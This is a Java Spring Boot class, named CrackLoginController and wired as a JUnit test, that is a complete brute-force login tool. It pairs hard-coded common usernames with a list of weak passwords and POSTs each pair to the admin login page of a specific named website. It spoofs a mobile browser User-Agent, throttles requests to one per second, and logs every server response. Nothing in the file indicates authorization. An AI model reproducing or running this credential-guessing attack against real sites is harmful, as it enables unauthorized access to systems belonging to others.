package com.fengx.mytest.other.login;

import com.google.common.collect.Lists;
import lombok.extern.slf4j.Slf4j;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.*;
import org.springframework.test.context.junit4.SpringRunner;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.util.MultiValueMap;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.client.RestTemplate;

import java.util.List;

@Slf4j
@RequestMapping("/crackLogin")
@RestController
@RunWith(SpringRunner.class)
@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.RANDOM_PORT)
public class CrackLoginController {

    private final List<String> users = Lists.newArrayList(
            "admin", "root", "user", "user1"
    );
    private final List<String> passwords = Lists.newArrayList(
            "2147796","510885", "user", "admin", "root","user","123456", "123456789", "password", "12345678", "111111", "123123", "12345", "1234567890", "1234567", "qwerty", "000000", "1234"
    );
    @Autowired
    private RestTemplate restTemplate;

    @Test
    public void test() {
        try {
            begin();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @PostMapping("/begin")
    public String begin() throws InterruptedException {
        String url = "https://dh.amiao.co/admin/login.php";
        HttpHeaders httpHeaders = new HttpHeaders();
        httpHeaders.set("Accept", "text/html, */*; q=0.01");
        httpHeaders.setContentType(MediaType.APPLICATION_FORM_URLENCODED);

        for (String user : users) {
            for (String pass : passwords) {
                MultiValueMap<String, Object> params = new LinkedMultiValueMap<>();
                params.add("user", user);
                params.add("pass", pass);
                String http = http(httpHeaders, url, params);
                log.info("user:" + user + " pass:" + pass);
                log.info(http);
                Thread.sleep(1000);
                log.info("-------------------------");
            }
        }
        return "成功";
    }

    private <T> String http(HttpHeaders headers, String url, T body) {
        headers.set("User-Agent", "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.25 Mobile Safari/537.36");
        HttpEntity<T> entity;
        if (body == null) {
            entity = new HttpEntity<>(headers);
        } else {
            entity = new HttpEntity<>(body, headers);
        }
        ResponseEntity<String> results = restTemplate.exchange(url, HttpMethod.POST, entity, String.class);
        return results.getBody();
    }
}
